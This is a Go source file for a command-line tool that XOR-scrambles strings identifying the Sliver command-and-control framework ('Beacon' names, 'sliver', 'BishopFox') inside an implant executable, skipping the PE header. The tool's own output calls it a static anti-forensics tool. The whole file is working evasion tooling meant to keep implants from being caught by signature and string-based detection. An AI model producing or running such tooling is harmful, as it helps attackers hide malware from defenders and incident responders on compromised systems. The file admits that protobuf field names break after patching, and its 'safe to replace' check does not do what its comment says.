package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
)

var targets = []string{
	"Beacon",
	"beacon",
	"BeaconID",
	"BeaconTasks",
	"BeaconJitter",
	"BeaconInterval",
	"BeaconRegister",
	"beaconResultQueue",
	"GetBeaconID",
	"GetBeaconJitter",
	"GetBeaconInterval",
	"sliver",
	"Sliver",
	"sliverpb",
	"bishopfox",
	"BishopFox",
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s <input.exe> [output.exe]\n", os.Args[0])
		os.Exit(1)
	}

	inputPath := os.Args[1]
	outputPath := inputPath + ".patched"
	if len(os.Args) >= 3 {
		outputPath = os.Args[2]
	}

	data, err := os.ReadFile(inputPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to read input: %v\n", err)
		os.Exit(1)
	}

	key := make([]byte, 16)
	rand.Read(key)
	fmt.Printf("XOR key: %s\n", hex.EncodeToString(key))

	totalPatched := 0
	for _, target := range targets {
		count := xorPatchString(data, target, key)
		if count > 0 {
			fmt.Printf("Patched %d instances of %q\n", count, target)
			totalPatched += count
		}
	}

	if totalPatched == 0 {
		fmt.Println("No target strings found, nothing to patch")
		os.Exit(0)
	}

	err = os.WriteFile(outputPath, data, 0755)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to write output: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nPatched %d total strings -> %s\n", totalPatched, outputPath)
	fmt.Println("NOTE: protobuf deserialization will break for patched field names.")
	fmt.Println("This is a static anti-forensics tool, not a runtime decryptor.")
	fmt.Println("The implant must not rely on string-matching these values at runtime.")
}

func xorPatchString(data []byte, target string, key []byte) int {
	targetBytes := []byte(target)
	count := 0
	for i := 0; i <= len(data)-len(targetBytes); i++ {
		if matchAt(data, i, targetBytes) {
			if isSafeToReplace(data, i, len(targetBytes)) {
				for j := 0; j < len(targetBytes); j++ {
					data[i+j] = data[i+j] ^ key[j%len(key)]
				}
				count++
			}
		}
	}
	return count
}

func matchAt(data []byte, offset int, target []byte) bool {
	for i, b := range target {
		if data[offset+i] != b {
			return false
		}
	}
	return true
}

func isSafeToReplace(data []byte, offset int, length int) bool {
	// Skip if inside the PE header (first 4KB)
	if offset < 4096 {
		return false
	}
	// Skip if the string is part of a longer alphanumeric sequence
	// that looks like a Go symbol table entry we shouldn't break
	// For now, patch everything outside the PE header
	_ = strings.Contains
	return true
}
